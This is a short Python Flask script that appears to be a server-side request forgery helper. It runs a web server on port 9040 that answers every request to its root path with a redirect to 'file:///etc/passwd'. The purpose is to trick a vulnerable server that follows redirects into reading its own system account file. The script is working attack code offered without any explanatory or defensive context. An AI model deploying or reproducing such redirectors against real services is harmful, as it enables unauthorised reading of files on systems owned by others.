#!/usr/bin/env python3
from flask import Flask,make_response,redirect,request

host = '0.0.0.0'
port = 9040
ssrf_host = 'file:///etc/passwd'
app = Flask(__name__)


@app.route('/')
def index():
    return make_response(redirect(ssrf_host))


if __name__ == '__main__':
    app.run(
            host = host,
            port = port,
            debug = False
            )
